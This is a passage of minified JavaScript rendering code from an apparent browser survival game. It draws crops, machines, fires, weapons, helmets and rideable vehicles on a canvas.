                        Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                var e, t, i, n, r = 15 & this.info;
                10 === this.info || 0 == r ? (fe.rotate(this.angle),
                    this.ground.update(),
                    r = -(i = (16 & this.info ? sprite[ze.PLANT_PUMPKIN_DRIED] : sprite[ze.PLANT_PUMPKIN])[Fe.time]).width * this.ground.v,
                    n = -i.height * this.ground.v,
                    Ke(fe, i, -r / 2 + e, -n / 2 + t, r, n)) : (i = (16 & this.info ? sprite[ze.DRIED_PUMPKIN] : sprite[ze.PUMPKIN])[Fe.time],
                        fe.translate(0, i.height / 2),
                        Ke(fe, i, e - i.width / 2, -i.height + t)),
                    fe.restore()
            }
            function zn() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                var e, t, i, n, r = 15 & this.info;
                10 === this.info || 0 == r ? (fe.rotate(this.angle),
                    this.ground.update(),
                    r = -(i = (16 & this.info ? sprite[ze.WHEAT_SEED_DRIED] : sprite[ze.WHEAT_SEED])[Fe.time]).width * this.ground.v,
                    n = -i.height * this.ground.v,
                    Ke(fe, i, -r / 2 + e, -n / 2 + t, r, n)) : (this.wind.update(),
                        i = (16 & this.info ? sprite[ze.DRIED_WHEAT] : sprite[ze.WILD_WHEAT])[Fe.time],
                        fe.translate(0, i.height / 2),
                        fe.rotate(this.wind.v),
                        Ke(fe, i, e - i.width / 2, -i.height + t)),
                    fe.restore()
            }
            function Bn() {
                var e, t, i, n, r;
                this.info < 10 || (fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0,
                    this.ground.update(),
                    n = -(i = sprite[ze.PLANT_SEED][Fe.time]).width * this.ground.v,
                    r = -i.height * this.ground.v,
                    Ke(fe, i, -n / 2 + e, -r / 2 + t, n, r),
                    fe.restore())
            }
            function wn() {
                if (10 !== this.info) {
                    var e, t, i;
                    fe.save(),
                        fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                        fe.rotate(this.angle),
                        t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                            t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                            e = Math.cos(this.hit.angle - this.angle) * t,
                            Math.sin(this.hit.angle - this.angle) * t) : e = 0,
                        i = (16 & this.info ? sprite[ze.DRIED_PLANT] : sprite[ze.PLANT_MINI])[Fe.time],
                        Ke(fe, i, -i.width / 2 + e, -i.width / 2 + t),
                        fe.restore();
                    for (var n = 15 & this.info, r = 0; r < n; r++)
                        this.fruits[r].draw(ze.FRUIT)
                }
            }
            function Wn() {
                var e, t, i, n, r;
                this.info < 10 || (fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0,
                    this.ground.update(),
                    n = -(i = sprite[ze.PLANT_TOMATO][Fe.time]).width * this.ground.v,
                    r = -i.height * this.ground.v,
                    Ke(fe, i, -n / 2 + e, -r / 2 + t, n, r),
                    fe.restore())
            }
            function Vn() {
                if (10 !== this.info) {
                    for (var e, t, i, n = 15 & this.info, r = 0; r < n; r++)
                        this.fruits[r].draw(ze.TOMATO, this.x, this.y);
                    fe.save(),
                        fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                        fe.rotate(this.angle),
                        t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                            t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                            e = Math.cos(this.hit.angle - this.angle) * t,
                            Math.sin(this.hit.angle - this.angle) * t) : e = 0,
                        i = (16 & this.info ? sprite[ze.DRIED_TOMATO_MINI] : sprite[ze.TOMATO_MINI])[Fe.time],
                        Ke(fe, i, -i.width / 2 + e, -i.width / 2 + t),
                        fe.restore()
                }
            }
            function kn() {
                var e, t;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0,
                    img = (2 == this.action ? sprite[ze.FURNACE_ON] : sprite[ze.FURNACE_OFF])[Fe.time],
                    Ke(fe, img, -img.width / 2 + e, -img.height / 2 + t),
                    fe.restore()
            }
            function Kn() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.ground.update(),
                    fe.globalAlpha = .3;
                var e = sprite[ze.GROUND_FIRE][Fe.time]
                    , t = -e.width * this.ground.v
                    , i = -e.height * this.ground.v;
                Ke(fe, e, -t / 2, -i / 2, t, i),
                    fe.globalAlpha = 1,
                    fe.restore()
            }
            function Un() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    31 & this.info && 992 & this.info && 31744 != (31744 & this.info) && (0 == this.smog.length || this.smog[this.smog.length - 1] <= ze.SMOG_PUSH) && this.smog.push(ze.SMOG);
                for (var e = 0; e < this.smog.length; e++) {
                    this.smog[e] = Math.max(0, this.smog[e] - qe * ze.SMOG_SPEED),
                        fe.globalAlpha = this.smog[e] / 1.3;
                    var t = 40 * (1 - this.smog[e])
                        , i = 35 * (1 - this.smog[e]) + 10;
                    ke(fe, -68 * Pe + Math.cos(-this.angle - Math.PI / 2) * t, -20 * Pe + Math.sin(-this.angle - Math.PI / 2) * t, i),
                        he(fe, "#333333")
                }
                fe.globalAlpha = 1,
                    0 < this.smog.length && 0 === this.smog[0] && this.smog.shift(),
                    fe.restore()
            }
            function Yn(e) {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.ground.update(),
                    fe.globalAlpha = .3;
                var t, i = sprite[ze.GROUND_FIRE][Fe.time], n = -i.width * this.ground.v, r = -i.height * this.ground.v;
                Ke(fe, i, -n / 2, -r / 2, n, r),
                    fe.globalAlpha = 1,
                    r = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        n = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        t = Math.cos(this.hit.angle - this.angle) * n,
                        Math.sin(this.hit.angle - this.angle) * n) : t = 0,
                    i = sprite[e][Fe.time],
                    Ke(fe, i, -i.width / 2 + t, -i.height / 2 + r),
                    fe.restore()
            }
            function Fn() {
                var e, t;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0,
                    img = 0 === this.info ? sprite[ze.SIGN][Fe.time] : sprite[ze.SYMBOLS][Fe.time][this.info - 1],
                    Ke(fe, img, -img.width / 2 + e, -img.height / 2 + t),
                    fe.restore()
            }
            function xn() {
                var e, t, i, n, r;
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                        t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                        e = Math.cos(this.hit.angle - this.angle) * t,
                        Math.sin(this.hit.angle - this.angle) * t) : e = 0,
                    31 & this.info && 992 & this.info && 31744 != (31744 & this.info) ? (i = sprite[ze.BREAD_OVEN_ON][Fe.time],
                        Ke(fe, i, -i.width / 2 + e, -i.height / 2 + t),
                        this.up.update(),
                        n = -(i = sprite[ze.BREAD_LIGHT_UP][Fe.time]).width * this.up.v,
                        r = -i.height * this.up.v,
                        Ke(fe, i, -n / 2 + +Pe, -r / 2 + 3 * Pe, n, r)) : (i = sprite[ze.BREAD_OVEN_OFF][Fe.time],
                            Ke(fe, i, -i.width / 2 + e, -i.height / 2 + t)),
                    fe.restore()
            }
            function Jn() {
                var e, t = this.hit.update ? (t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                    e = Math.cos(this.hit.angle - this.angle) * t,
                    Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                255 & this.info && 65280 != (65280 & this.info) && (this.rotate = (this.rotate + .5 * qe) % (2 * Math.PI)),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x + e, xe.cam.y + this.y + t),
                    fe.save(),
                    fe.rotate(this.rotate),
                    img = sprite[ze.WINDMILL_WINGS][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore(),
                    fe.save(),
                    fe.rotate(this.angl),
                    img = sprite[ze.WINDMILL_HEAD][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore(),
                    fe.restore()
            }
            function Xn() {
                var e, t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                    t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                    e = Math.cos(this.hit.angle - this.angle) * t,
                    Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                fe.save(),
                    255 & this.info && 65280 != (65280 & this.info) && (e += 2 * Math.random() - 1,
                        t += 2 * Math.random() - 1),
                    fe.translate(xe.cam.x + this.x + e, xe.cam.y + this.y + t),
                    fe.rotate(this.angle),
                    img = sprite[ze.EXTRACTOR_MACHINE_STONE][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    255 & this.info && 65280 != (65280 & this.info) && (this.rotate = (this.rotate + 3 * qe) % (2 * Math.PI)),
                    fe.rotate(this.rotate),
                    img = sprite[ze.EXTRACTOR_MACHINE0_STONE][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore()
            }
            function jn() {
                var e, t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                    t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                    e = Math.cos(this.hit.angle - this.angle) * t,
                    Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                fe.save(),
                    255 & this.info && 65280 != (65280 & this.info) && (e += 2 * Math.random() - 1,
                        t += 2 * Math.random() - 1),
                    fe.translate(xe.cam.x + this.x + e, xe.cam.y + this.y + t),
                    fe.rotate(this.angle),
                    img = sprite[ze.EXTRACTOR_MACHINE_GOLD][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    255 & this.info && 65280 != (65280 & this.info) && (this.rotate = (this.rotate + 3 * qe) % (2 * Math.PI)),
                    fe.rotate(this.rotate),
                    img = sprite[ze.EXTRACTOR_MACHINE0_GOLD][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore()
            }
            function qn() {
                var e, t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                    t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                    e = Math.cos(this.hit.angle - this.angle) * t,
                    Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                fe.save(),
                    255 & this.info && 65280 != (65280 & this.info) && (e += 2 * Math.random() - 1,
                        t += 2 * Math.random() - 1),
                    fe.translate(xe.cam.x + this.x + e, xe.cam.y + this.y + t),
                    fe.rotate(this.angle),
                    img = sprite[ze.EXTRACTOR_MACHINE_DIAMOND][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    255 & this.info && 65280 != (65280 & this.info) && (this.rotate = (this.rotate + 3 * qe) % (2 * Math.PI)),
                    fe.rotate(this.rotate),
                    img = sprite[ze.EXTRACTOR_MACHINE0_DIAMOND][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore()
            }
            function Zn() {
                var e, t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                    t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                    e = Math.cos(this.hit.angle - this.angle) * t,
                    Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                fe.save(),
                    255 & this.info && 65280 != (65280 & this.info) && (e += 2 * Math.random() - 1,
                        t += 2 * Math.random() - 1),
                    fe.translate(xe.cam.x + this.x + e, xe.cam.y + this.y + t),
                    fe.rotate(this.angle),
                    img = sprite[ze.EXTRACTOR_MACHINE_AMETHYST][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    255 & this.info && 65280 != (65280 & this.info) && (this.rotate = (this.rotate + 3 * qe) % (2 * Math.PI)),
                    fe.rotate(this.rotate),
                    img = sprite[ze.EXTRACTOR_MACHINE0_AMETHYST][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore()
            }
            function Qn() {
                var e, t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                    t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                    e = Math.cos(this.hit.angle - this.angle) * t,
                    Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                fe.save(),
                    255 & this.info && 65280 != (65280 & this.info) && (e += 2 * Math.random() - 1,
                        t += 2 * Math.random() - 1),
                    fe.translate(xe.cam.x + this.x + e, xe.cam.y + this.y + t),
                    fe.rotate(this.angle),
                    img = sprite[ze.EXTRACTOR_MACHINE_REIDITE][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    255 & this.info && 65280 != (65280 & this.info) && (this.rotate = (this.rotate + 3 * qe) % (2 * Math.PI)),
                    fe.rotate(this.rotate),
                    img = sprite[ze.EXTRACTOR_MACHINE0_REIDITE][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore()
            }
            function $n() {
                var e, t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                    t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                    e = Math.cos(this.hit.angle - this.angle) * t,
                    Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                fe.save(),
                    fe.translate(xe.cam.x + this.x + e, xe.cam.y + this.y + t),
                    fe.rotate(this.angle),
                    img = sprite[ze.WINDMILL][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore()
            }
            function er() {
                var e, t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                    t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                    e = Math.cos(this.hit.angle - this.angle) * t,
                    Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                this.rotate1 = (this.rotate1 + 3 * qe) % (2 * Math.PI),
                    this.rotate2 = (this.rotate2 - 3 * qe) % (2 * Math.PI),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x + e, xe.cam.y + this.y + t),
                    fe.save(),
                    fe.rotate(this.angle),
                    img = sprite[ze.EMERALD_MACHINE][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore(),
                    fe.save(),
                    fe.rotate(this.rotate1),
                    img = sprite[ze.EMERALD_MACHINE_ROTATE][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore(),
                    fe.save(),
                    fe.rotate(this.rotate2),
                    img = sprite[ze.EMERALD_MACHINE_HOLE][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore(),
                    fe.restore()
            }
            function tr() {
                var e, t = this.hit.update ? (this.hit.anim.update() && 0 == this.hit.anim.o && (this.hit.update = !1),
                    t = (1 - this.hit.anim.v) * qe * 600 * Pe,
                    e = Math.cos(this.hit.angle - this.angle) * t,
                    Math.sin(this.hit.angle - this.angle) * t) : e = 0;
                this.rotate1 = (this.rotate1 + 3 * qe) % (2 * Math.PI),
                    this.rotate2 = (this.rotate2 - 3 * qe) % (2 * Math.PI),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x + e, xe.cam.y + this.y + t),
                    fe.save(),
                    fe.rotate(this.angle),
                    img = sprite[ze.RESURRECTION][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore(),
                    fe.save(),
                    fe.rotate(this.rotate1),
                    img = sprite[ze.RESURRECTION_ROTATE][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore(),
                    fe.save(),
                    fe.rotate(this.rotate2),
                    img = sprite[ze.RESURRECTION_HOLE][Fe.time],
                    Ke(fe, img, -img.width / 2, -img.height / 2),
                    fe.restore(),
                    fe.restore()
            }
            function ir() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.halo.update(),
                    img = sprite[ze.EMERALD_MACHINE_GROUND][Fe.time],
                    w = -img.width * this.halo.v,
                    h = -img.height * this.halo.v,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function nr() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.halo.update(),
                    img = sprite[ze.RESURRECTION_GROUND][Fe.time],
                    w = -img.width * this.halo.v,
                    h = -img.height * this.halo.v,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function rr() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.halo.update(),
                    img = sprite[ze.HALO_FIRE][Fe.time],
                    w = -img.width * this.halo.v,
                    h = -img.height * this.halo.v,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function or() {
                fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.angle),
                    this.fire.update(),
                    img = sprite[ze.FIRE][Fe.time],
                    w = -img.width * this.fire.v,
                    h = -img.height * this.fire.v,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    this.halo.update(),
                    img = sprite[ze.HALO_FIRE][Fe.time],
                    w = -img.width * this.halo.v,
                    h = -img.height * this.halo.v,
                    Ke(fe, img, -w / 2, -h / 2, w, h),
                    fe.restore()
            }
            function ar(e, t, i) {
                if (0 <= e)
                    switch (img = sprite[e][Fe.time],
                    e) {
                        case ze.PICK:
                        case ze.PICK_GOLD:
                        case ze.PICK_DIAMOND:
                        case ze.PICK_WOOD:
                        case ze.PICK_AMETHYST:
                        case ze.PICK_REIDITE:
                            fr(e, img, -img.width / 2 - Pe * (45 + t), -img.height / 2 + Pe * (i + 22));
                            break;
                        case ze.SWORD_WOOD:
                        case ze.SWORD:
                        case ze.SWORD_GOLD:
                        case ze.SWORD_DIAMOND:
                            Gr(e, img, -img.width / 4 - Pe * (47 + t), -img.height / 4 + Pe * (i + 45));
                            break;
                        case ze.SWORD_AMETHYST:
                            Gr(e, img, -img.width / 4 - Pe * (52 + t), -img.height / 4 + Pe * (i + 45));
                            break;
                        case ze.REIDITE_SWORD:
                            Gr(e, img, -img.width / 4 - Pe * (47 + t), -img.height / 4 + Pe * (i + 44));
                            break;
                        case ze.PIRATE_SWORD:
                            fr(e, img, -img.width / 2 - Pe * (47 + t), -img.height / 2 + Pe * (i + 44));
                            break;
                        case ze.DRAGON_SWORD:
                            fr(e, img, -img.width / 2 - Pe * (40 + t), -img.height / 2 + Pe * (i + 65));
                            break;
                        case ze.WOOD_SPEAR:
                        case ze.REIDITE_SPEAR:
                            Gr(e, img, -img.width / 4 - Pe * (37 + t), -img.height / 4 + Pe * (i + 85));
                            break;
                        case ze.PITCHFORK2:
                        case ze.PITCHFORK:
                            Gr(e, img, -img.width / 4 - Pe * (26 + t), -img.height / 4 + Pe * (i + 77));
                            break;
                        case ze.LAVA_SPEAR:
                            Gr(e, img, -img.width / 4 - Pe * (37 + t), -img.height / 4 + Pe * (i + 85));
                            break;
                        case ze.LAVA_SWORD:
                            Gr(e, img, -img.width / 4 - Pe * (47 + t), -img.height / 4 + Pe * (i + 44));
                            break;
                        case ze.WOOD_BOW:
                        case ze.STONE_BOW:
                        case ze.GOLD_BOW:
                        case ze.DIAMOND_BOW:
                        case ze.AMETHYST_BOW:
                        case ze.REIDITE_BOW:
                        case ze.DRAGON_BOW:
                            Gr(e, img, -img.width / 4 - Pe * (37 + t), -img.height / 4 + Pe * (i + 30));
                            break;
                        case ze.MACHETE:
                            Gr(e, img, -img.width / 4 - Pe * (47 + t), -img.height / 4 + Pe * (i + 35));
                            break;
                        case ze.WAND1:
                        case ze.WAND2:
                            Gr(e, img, -img.width / 4 - Pe * (47 + t), -img.height / 4 + Pe * (i + 40));
                            break;
                        case ze.SADDLE:
                            Gr(e, img, -img.width / 4 - Pe * (47 + t), -img.height / 4 + Pe * (i + 34));
                            break;
                        case ze.SPEAR:
                        case ze.GOLD_SPEAR:
                        case ze.DIAMOND_SPEAR:
                        case ze.AMETHYST_SPEAR:
                            Gr(e, img, -img.width / 4 - Pe * (37 + t), -img.height / 4 + Pe * (i + 90));
                            break;
                        case ze.CRAB_SPEAR:
                            Gr(e, img, -img.width / 4 - Pe * (40 + t), -img.height / 4 + Pe * (i + 85));
                            break;
                        case ze.DRAGON_SPEAR:
                            fr(e, img, -img.width / 2 - Pe * (39 + t), -img.height / 2 + Pe * (i + 90));
                            break;
                        case ze.HAMMER:
                        case ze.HAMMER_GOLD:
                        case ze.HAMMER_DIAMOND:
                        case ze.HAMMER_AMETHYST:
                        case ze.HAMMER_REIDITE:
                        case ze.SUPER_HAMMER:
                            fr(e, img, -img.width / 2 - Pe * (46 + t), -img.height / 2 + Pe * (i + 35));
                            break;
                        case ze.WATERING_CAN_FULL:
                            fr(e, img, -img.width / 2 - Pe * (47 + t), -img.height / 2 + Pe * (i + 54));
                            break;
                        case ze.SHOVEL:
                        case ze.SHOVEL_GOLD:
                        case ze.SHOVEL_DIAMOND:
                        case ze.SHOVEL_AMETHYST:
                            fr(e, img, -img.width / 2 - Pe * (46 + t), -img.height / 2 + Pe * (i + 35));
                            break;
                        case ze.SPANNER:
                            fr(e, img, -img.width / 2 - Pe * (47 + t), -img.height / 2 + Pe * (i + 20))
                    }
            }
            function sr(e) {
                if (0 < e) {
                    var t = sprite[e][Fe.time];
                    switch (e) {
                        case ze.WOOD_HELMET:
                            fr(e, t, -t.width / 2 + 2 * Pe, -t.height / 2 - 5 * Pe);
                            break;
                        case ze.EARMUFFS:
                            fr(e, t, -t.width / 2, -t.height / 2 - 18 * Pe);
                            break;
                        case ze.COAT:
                            fr(e, t, -t.width / 2, -t.height / 2 - 10 * Pe);
                            break;
                        case ze.EXPLORER_HAT:
                            fr(e, t, -t.width / 2, -t.height / 2 - 19 * Pe);
                            break;
                        case ze.PIRATE_HAT:
                            Gr(e, t, -t.width / 4, -t.height / 4 - 20 * Pe);
                            break;
                        case ze.STONE_HELMET:
                            fr(e, t, -t.width / 2 - +Pe, -t.height / 2 - 23 * Pe);
                            break;
                        case ze.GOLD_HELMET:
                            fr(e, t, -t.width / 2, -t.height / 2 - 5 * Pe);
                            break;
                        case ze.DIAMOND_HELMET:
                            fr(e, t, -t.width / 2, -t.height / 2 - 2 * Pe);
                            break;
                        case ze.AMETHYST_HELMET:
                            fr(e, t, -t.width / 2 + 1.5 * Pe, -t.height / 2 - +Pe);
                            break;
                        case ze.REIDITE_HELMET:
                        case ze.DIAMOND_PROTECTION:
                        case ze.AMETHYST_PROTECTION:
                        case ze.REIDITE_PROTECTION:
                        case ze.TURBAN1:
                        case ze.TURBAN2:
                        case ze.PILOT_HELMET:
                        case ze.LAVA_HELMET:
                        case ze.WITCH:
                        case ze.FUR_HAT:
                        case ze.FLOWER_HAT:
                            Gr(e, t, -t.width / 4, -t.height / 4 + 2 * Pe);
                            break;
                        case ze.CHRISTMAS_HAT:
                        case ze.ELF_HAT:
                            fr(e, t, -t.width / 2 - 5 * Pe, -t.height / 2 - 2 * Pe);
                            break;
                        case ze.CAP_SCARF:
                        case ze.WINTER_HOOD:
                        case ze.DIVING_MASK:
                            fr(e, t, -t.width / 2, -t.height / 2 - 2 * Pe);
                            break;
                        case ze.SUPER_DIVING_SUIT:
                            fr(e, t, -t.width / 2 + 2 * Pe, -t.height / 2);
                            break;
                        case ze.DRAGON_HELMET:
                            fr(e, t, -t.width / 2, -t.height / 2 - 5 * Pe);
                            break;
                        case ze.CROWN_GREEN:
                        case ze.CROWN_ORANGE:
                        case ze.CROWN_BLUE:
                            fr(e, t, -t.width / 2 - +Pe, -t.height / 2);
                            break;
                        case ze.HOOD:
                            fr(e, t, -t.width / 2, -t.height / 2 + 2 * Pe);
                            break;
                        case ze.PEASANT:
                        case ze.WINTER_PEASANT:
                            fr(e, t, -t.width / 2, -t.height / 2 + 8 * Pe);
                            break;
                        case ze.CROWN_CRAB:
                            fr(e, t, -t.width / 2, -t.height / 2 - 4 * Pe)
                    }
                }
            }
            function _r() {
                var e, t, i, n;
                this.ghost || 0 === this.vehicle || (this.x == this.r.x && this.y == this.r.y || (t = (Utils.get_angle_2(this.x, this.y, this.r.x, this.r.y) + Math.PI / 2) % (2 * Math.PI),
                    this.vehicle_fx2 = Utils.reduceAngle(t, this.vehicle_fx2),
                    this.vehicle_fx2 = Utils.lerp(this.vehicle_fx2, t, .018)),
                    fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    fe.rotate(this.vehicle_fx2),
                    this.vehicle === Be.BOAT ? ((50 < this.speed || 0 < this.vehicle_fx1) && (50 < this.speed ? this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + qe) : this.vehicle_fx1 = Math.max(0, this.vehicle_fx1 - qe),
                        fe.globalAlpha = this.vehicle_fx1,
                        n = sprite[ze.BOAT_WAVE][Fe.time],
                        Gr(ze.BOAT_WAVE, n, -n.width / 4, -n.height / 4),
                        fe.globalAlpha = 1),
                        n = sprite[ze.BOAT][Fe.time],
                        Gr(ze.BOAT, n, -n.width / 4, -n.height / 4)) : this.vehicle === Be.HAWK ? (this.vehicle_fx5 = Utils.lerp(this.vehicle_fx5, this.speed, .018),
                            this.vehicle_fx4.update(),
                            85 < this.speed ? this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + qe / 4) : this.vehicle_fx1 = Math.max(.1, this.vehicle_fx1 - qe),
                            n = sprite[ze.HAWK_TAMED][Fe.time],
                            Gr(ze.HAWK_TAMED, n, -n.width / 4, -n.height / 4),
                            n = sprite[ze.HAWK_WING_LEFT_TAMED][Fe.time],
                            w = -n.width,
                            h = -n.height,
                            fe.save(),
                            fe.translate(-20 * Pe, -20 * Pe),
                            fe.rotate(this.vehicle_fx4.v * this.vehicle_fx1),
                            Ke(fe, n, -w / 4, -h / 4, w / 2, h / 2),
                            fe.restore(),
                            n = sprite[ze.HAWK_WING_RIGHT_TAMED][Fe.time],
                            fe.save(),
                            fe.translate(20 * Pe, -20 * Pe),
                            fe.rotate(-this.vehicle_fx4.v * this.vehicle_fx1),
                            Ke(fe, n, -w / 4, -h / 4, w / 2, h / 2),
                            fe.restore()) : this.vehicle === Be.BABY_LAVA ? (this.vehicle_fx5 = Utils.lerp(this.vehicle_fx5, this.speed, .018),
                                this.vehicle_fx4.update(),
                                85 < this.speed ? this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + qe / 4) : this.vehicle_fx1 = Math.max(.1, this.vehicle_fx1 - qe),
                                n = sprite[ze.BABY_LAVA_TAMED][Fe.time],
                                Gr(ze.BABY_LAVA_TAMED, n, -n.width / 4, -n.height / 4),
                                n = sprite[ze.BABY_LAVA_WING_LEFT_TAMED][Fe.time],
                                w = -n.width,
                                h = -n.height,
                                fe.save(),
                                fe.translate(-40 * Pe, -45 * Pe),
                                fe.rotate(this.vehicle_fx4.v * this.vehicle_fx1),
                                Ke(fe, n, -w / 4, -h / 4, w / 2, h / 2),
                                fe.restore(),
                                n = sprite[ze.BABY_LAVA_WING_RIGHT_TAMED][Fe.time],
                                fe.save(),
                                fe.translate(40 * Pe, -45 * Pe),
                                fe.rotate(-this.vehicle_fx4.v * this.vehicle_fx1),
                                Ke(fe, n, -w / 4, -h / 4, w / 2, h / 2),
                                fe.restore()) : this.vehicle === Be.BABY_DRAGON ? (this.vehicle_fx5 = Utils.lerp(this.vehicle_fx5, this.speed, .018),
                                    this.vehicle_fx4.update(),
                                    85 < this.speed ? this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + qe / 4) : this.vehicle_fx1 = Math.max(.1, this.vehicle_fx1 - qe),
                                    n = sprite[ze.BABY_DRAGON_TAMED][Fe.time],
                                    Gr(ze.BABY_DRAGON_TAMED, n, -n.width / 4, -n.height / 4),
                                    n = sprite[ze.BABY_DRAGON_WING_LEFT_TAMED][Fe.time],
                                    w = -n.width,
                                    h = -n.height,
                                    fe.save(),
                                    fe.translate(-40 * Pe, -45 * Pe),
                                    fe.rotate(this.vehicle_fx4.v * this.vehicle_fx1),
                                    Ke(fe, n, -w / 4, -h / 4, w / 2, h / 2),
